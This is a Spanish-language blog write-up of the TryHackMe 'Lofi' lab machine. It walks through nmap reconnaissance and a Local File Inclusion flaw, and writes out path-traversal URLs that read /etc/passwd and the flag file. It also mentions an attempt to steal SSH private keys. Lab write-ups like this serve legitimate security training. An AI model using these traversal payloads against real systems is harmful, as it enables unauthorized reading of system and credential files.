---
layout: single
title: Lofi - TryHackMe
excerpt: "En esta máquina sencilla aprendemos a como funciona la vulnerabilidad *LFI* **(Local File Inclusion)**, para conseguir la bandera."
date: 2026-01-25
classes: wide
header:
  teaser: /assets/images/thm-writeup-lofi/logo_lof.png
  teaser_home_page: true
  icon: /assets/images/tryhackme.webp
categories:
  - TryHackMe
  - Pentesting
tags:
  - writeup
  - HackingWeb
  - LFI
---

![](/assets/images/thm-writeup-lofi/logo_lof.png)



## WRITE UP
Ejemplo: 10.66.128.249 (víctima) TTL=63 Linux


### RECONOCIMIENTO

Lo primero que vamos hacer es crear nuestro entorno de trabajo: <span style="color:lightblue">Lofi</span>

Dentro usaremos la herramienta de s4vitar *mkt* cual nos generara las carpetas necesarias para tener todo más organizado; **Nmap...**


Para empezar el reconocimiento, enviamos una traza ICMP a la <span style="color:red">IP</span> de la maquina víctima, para comprobar que tenemos conectividad, tenemos dos alternativas:

-Usar el script *whichSystem* que nos dirá directamente el equipo al que estamos atacando, por ende habrá tenido ping para dar la respuesta. Es más silencioso que nmap.

```bash
whichSystem.py 10.66.128.249
```

![](/assets/images/thm-writeup-lofi/which_lof.png)


-Usar el comando *ping*:

```bash
ping -R 10.66.128.249 -c1
``` 

*-R Lo que hace es un record route que consiste que a la hora de hacer la petición se lo envía a un nodo intermediario para que no sea directa la petición, nos muestra el proceso.*

![](/assets/images/thm-writeup-lofi/conectividad_lof.png)


Después de confirmar que tenemos conectividad, usaremos **nmap** para a ver que puertos tenemos abiertos y que protocolos/servicios tenemos.


```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.66.128.249 -oG allPorts
``` 
*Veremos porque el formato grepeable, es importante.*

![](/assets/images/thm-writeup-lofi/nmap1_lof.png)


Una vez hecho, usaremos otra herramienta de s4vitar *extractports* al archivo allPorts
cual nos copiara los puertos, y escanearlos con nmap. 

```bash
extractports.sh allPorts
```

![](/assets/images/thm-writeup-lofi/extractp_lof.png)


```bash
nmap -sVC -p22,80,8080 10.66.128.249 -oN targeted
```
*Este formato lo emplearemos con batcar lenguaje java para verlo mejor*

![](/assets/images/thm-writeup-lofi/nmap2_lof.png)


Una vez escaneado, usaremos batcat:
>https://github.com/sharkdp/bat.git

```bash
batcat targeted -l java
```
*nos mostrara la salida en un formato más bonito, con java*

![](/assets/images/thm-writeup-lofi/batcat_lof.png)


### ANÁLISIS WEB: Lo-Fi Music

Como vemos un *whatweb*, vamos a probar hacer un pequeño reconocimiento a nivel web. Nos muestra la arquitectura y demás, o podemos usar la extensión **wappalyzer**, lo mismo pero por gráfico.

```bash
whatweb http://10.66.128.249/
```

![](/assets/images/thm-writeup-lofi/whatweb_lof.png)


Veremos una página de música, aparentemente no vulnerable, vemos que hay varios enlaces que nos llevan al apartado que le demos: **Games,Relax...**

![](/assets/images/thm-writeup-lofi/pag_log.png)


Si le pinchamos a uno vemos que la URL se ve así -> http://10.66.128.249/?page=Games.php
/**?page=** nos da una grave advertencia sobre  **LFI**.

**page**<span style="color:orange">=</span>Game.php

![](/assets/images/thm-writeup-lofi/pag2_lof.png)

### VULNERABILIDAD WEB: LOCAL FILE INCLUSION

>cuando la aplicación web no valida correctamente la entrada del usuario, permitiendo a un atacante manipular las rutas de archivos mediante técnicas como "path traversal" (navegación por directorios, ej: `../`).

```bash
http://10.66.128.249/?page=../../../../etc/passwd
```

![](/assets/images/thm-writeup-lofi/lfi_lof.png)

"**CTRL + U**" para ver mejor desde el código fuente. Usuarios con bash solo tenemos a <span style="color:blue">root</span>.

![](/assets/images/thm-writeup-lofi/lfimejor_lof.png)


Podríamos intentar robar las *claves privadas de ssh* (id_rsa) de los usuarios, pero no se puede, aparte de que root es privilegiado.

![](/assets/images/thm-writeup-lofi/claves_lof.png)


### BANDERA

Para leer la bandera:

```bash
http://10.66.128.249/?page=../../../flag.txt
```

![](/assets/images/thm-writeup-lofi/flag_lof.png)
